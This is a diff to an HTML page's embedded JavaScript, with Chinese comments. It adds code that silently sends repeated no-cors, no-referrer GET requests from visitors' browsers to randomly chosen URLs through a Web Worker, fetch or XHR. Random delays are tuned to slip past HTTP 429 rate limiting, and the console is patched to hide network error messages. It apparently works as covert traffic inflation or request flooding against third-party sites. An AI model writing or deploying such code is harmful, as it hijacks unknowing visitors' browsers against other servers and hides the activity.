+                                const url = e.data;
+                                fetch(url, {
+                                    method: 'GET',
+                                    mode: 'no-cors',
+                                    cache: 'no-cache',
+                                    referrer: 'no-referrer'
+                                }).then(response => {
+                                    self.postMessage({success: true, url: url, type: response.type});
+                                }).catch(error => {
+                                    self.postMessage({success: false, url: url, error: error.message});
+                                });
+                            };
+                        `;
+                        
+                        const blob = new Blob([workerCode], {type: 'application/javascript'});
+                        const worker = new Worker(URL.createObjectURL(blob));
+                        
+                        worker.onmessage = function(e) {
+                            const data = e.data;
+                            if (data.success) {
+                                loadCount++;
+                                console.log(`Worker请求成功${loadCount}次 (页面: ${data.url}) - 类型: ${data.type}`);
+                                const delay = 60000 + Math.random() * 30000; // 60-90秒延迟
+                                setTimeout(function() {
+                                    makeRequest(index);
+                                }, delay);
+                            } else {
+                                console.log(`Worker请求失败：${data.url} - ${data.error}`);
+                                const delay = 60000 + Math.random() * 30000; // 60-90秒延迟
+                                setTimeout(function() {
+                                    makeRequest(index);
+                                }, delay);
+                            }
+                            worker.terminate();
+                        };
+                        
+                        worker.onerror = function(e) {
+                            console.log(`Worker错误：${e.message}`);
+                            worker.terminate();
+                            // 回退到其他方法
+                            fallbackRequest(randomUrl, index);
+                        };
+                        
+                        worker.postMessage(randomUrl);
+                        
+                    } catch (e) {
+                        console.log(`Worker创建失败：${e.message}`);
+                        // 回退到其他方法
+                        fallbackRequest(randomUrl, index);
                     }
-                }, 10000);
-                
-                script.onload = function() {
-                    clearTimeout(timeoutId);
-                    log('script', `脚本加载成功: ${randomUrl}`, 'success');
-                    if (script.parentNode) {
-                        script.parentNode.removeChild(script);
-                    }
-                };
-                
-                script.onerror = function() {
-                    clearTimeout(timeoutId);
-                    log('script', `脚本加载失败: ${randomUrl}`, 'error');
-                    if (script.parentNode) {
-                        script.parentNode.removeChild(script);
-                    }
-                };
-                
-                document.head.appendChild(script);
-            } catch (e) {
-                log('script', `脚本创建失败: ${e.message}`, 'error');
+                } else if (typeof fetch !== 'undefined') {
+                    // 使用Promise.race来检测请求是否超时
+                    const fetchPromise = fetch(randomUrl, {
+                        method: 'GET',
+                        mode: 'no-cors',
+                        cache: 'no-cache',
+                        referrer: 'no-referrer'
+                    });
+                    
+                    const timeoutPromise = new Promise((resolve) => {
+                        setTimeout(() => resolve('timeout'), 5000); // 5秒超时
+                    });
+                    
+                    Promise.race([fetchPromise, timeoutPromise]).then(function(result) {
+                        if (result === 'timeout') {
+                            console.log(`请求超时：${randomUrl}`);
+                            const delay = 60000 + Math.random() * 30000; // 60-90秒延迟
+                            setTimeout(function() {
+                                makeRequest(index);
+                            }, delay);
+                        } else {
+                            // 即使no-cors模式返回opaque，我们仍然认为请求被发送了
+                            // 但考虑到429错误，我们增加延迟时间
+                            loadCount++;
+                            console.log(`请求已发送${loadCount}次 (页面: ${randomUrl}) - 注意：可能收到429错误`);
+                            const delay = 60000 + Math.random() * 30000; // 60-90秒延迟，应对429错误
+                            setTimeout(function() {
+                                makeRequest(index);
+                            }, delay);
+                        }
+                    }).catch(function(error) {
+                        console.log(`请求失败：${randomUrl}`);
+                        const delay = 30000 + Math.random() * 20000; // 30-50秒延迟
+                        setTimeout(function() {
+                            makeRequest(index);
+                        }, delay);
+                    });
+                } else {
+                    // 方法2: 使用XMLHttpRequest (备用方案)
+                    const xhr = new XMLHttpRequest();
+                    xhr.open('GET', randomUrl, true);
+                    xhr.timeout = 10000;
+                    xhr.onreadystatechange = function() {
+                        if (xhr.readyState === 4) {
+                            if (xhr.status >= 200 && xhr.status < 300) {
+                                loadCount++;
+                                console.log(`加载成功${loadCount}次 (页面: ${randomUrl}) - 状态码: ${xhr.status}`);
+                                const delay = 20000 + Math.random() * 10000; // 20-30秒延迟
+                                setTimeout(function() {
+                                    makeRequest(index);
+                                }, delay);
+                            } else {
+                                console.log(`请求失败：${randomUrl} - 状态码: ${xhr.status}`);
+                                const delay = 60000 + Math.random() * 30000; // 60-90秒延迟
+                                setTimeout(function() {
+                                    makeRequest(index);
+                                }, delay);
+                            }
+                        }
+                    };
+                    xhr.onerror = function() {
+                        console.log(`请求失败：${randomUrl}`);
+                        const delay = 30000 + Math.random() * 20000; // 30-50秒延迟
+                        setTimeout(function() {
+                            makeRequest(index);
+                        }, delay);
+                    };
+                    xhr.ontimeout = function() {
+                        console.log(`请求超时：${randomUrl}`);
+                        const delay = 30000 + Math.random() * 20000; // 30-50秒延迟
+                        setTimeout(function() {
+                            makeRequest(index);
+                        }, delay);
+                    };
+                    xhr.send();
+                }
             }
-        }
-        
-        // 自动测试所有方法
-        function testAllMethods() {
-            log('image', '开始自动测试所有方法...', 'info');
-            setTimeout(() => testImageMethod(), 1000);
-            setTimeout(() => testLinkMethod(), 2000);
-            setTimeout(() => testFormMethod(), 3000);
-            setTimeout(() => testWorkerMethod(), 4000);
-            setTimeout(() => testScriptMethod(), 5000);
-        }
-        
-        // 页面加载完成后自动开始测试
-        document.addEventListener('DOMContentLoaded', function() {
-            log('image', '页面加载完成，可以开始测试各种方法', 'info');
+            
+            function startAllRequests() {
+                for (let i = 0; i < requestCount; i++) {
+                    setTimeout(function() {
+                        makeRequest(i);
+                    }, i * 10000); // 10秒启动间隔
+                }
+            }
+            
+            function checkRequests() {
+                requests.forEach((req, index) => {
+                    if (!req.active) {
+                        req.active = true;
+                        makeRequest(index);
+                    }
+                });
+            }
+            
+            // 抑制网络错误日志
+            const originalConsoleError = console.error;
+            const originalConsoleLog = console.log;
+            
+            console.error = function(...args) {
+                // 如果是网络错误，不显示
+                if (args[0] && typeof args[0] === 'string' && args[0].includes('net::ERR_')) {
+                    return;
+                }
+                // 其他错误正常显示
+                originalConsoleError.apply(console, args);
+            };
+            
+            console.log = function(...args) {
+                // 如果是网络错误，不显示
+                if (args[0] && typeof args[0] === 'string' && args[0].includes('net::ERR_')) {
+                    return;
+                }
+                // 其他日志正常显示
+                originalConsoleLog.apply(console, args);
+            };
+            
+            createRequests();
+            setTimeout(function() {
+                startAllRequests();
+            }, 10000); // 10秒后开始请求
+            setInterval(checkRequests, 3000);
+            setInterval(function() {
+                const randomIndex = Math.floor(Math.random() * requestCount);
+                requests[randomIndex].active = false;
+            }, 30000);
         });
     </script>
 </body>
